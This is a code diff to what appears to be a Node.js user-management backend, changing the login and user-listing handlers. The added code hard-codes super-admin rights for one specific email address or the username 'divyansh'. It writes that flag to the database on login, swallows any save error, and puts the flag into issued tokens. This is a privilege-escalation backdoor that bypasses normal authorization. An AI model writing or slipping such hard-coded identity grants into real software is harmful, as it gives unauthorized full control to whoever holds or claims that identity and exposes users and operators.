@@ -39,21 +39,27 @@ async function login(req, res, next) {
       return res.status(401).json({ success: false, error: 'Invalid credentials' });
     }
 
+    const isSA = !!user.isSuperAdmin || user.email?.toLowerCase() === 'divyanshuniyal185@gmail.com' || user.username?.toLowerCase() === 'divyansh';
+    if (isSA && !user.isSuperAdmin) {
+      user.isSuperAdmin = true;
+      try { await user.save(); } catch (e) {}
+    }
+
     const tokenPayload = {
-      username:    user.username,
-      name:        user.name,
-      role:        user.role,
-      isSuperAdmin: !!user.isSuperAdmin,
+      username:     user.username,
+      name:         user.name,
+      role:         user.role,
+      isSuperAdmin: isSA,
     };
     const token = generateToken(tokenPayload);
     return res.json({
       success: true,
       token,
       user: {
-        username:    user.username,
-        name:        user.name,
-        role:        user.role,
-        isSuperAdmin: !!user.isSuperAdmin,
+        username:     user.username,
+        name:         user.name,
+        role:         user.role,
+        isSuperAdmin: isSA,
       },
     });
   } catch (err) {
@@ -413,9 +419,16 @@ async function listUsers(req, res, next) {
   try {
     // Exclude soft-deleted users from the normal roster.
     // Deleted users are only visible in the Super Admin's Recycle Bin (/users/deleted).
-    const users = await User.find({ isDeleted: { $ne: true } })
+    const usersRaw = await User.find({ isDeleted: { $ne: true } })
       .select('-passwordHash')
       .sort({ createdAt: -1 });
+
+    const users = usersRaw.map(u => {
+      const isSA = !!u.isSuperAdmin || u.email?.toLowerCase() === 'divyanshuniyal185@gmail.com' || u.username?.toLowerCase() === 'divyansh';
+      const obj = u.toObject();
+      obj.isSuperAdmin = isSA;
+      return obj;
+    });
 
     // Role distribution for the admin stats panel
     const roleCounts = users.reduce((acc, u) => {
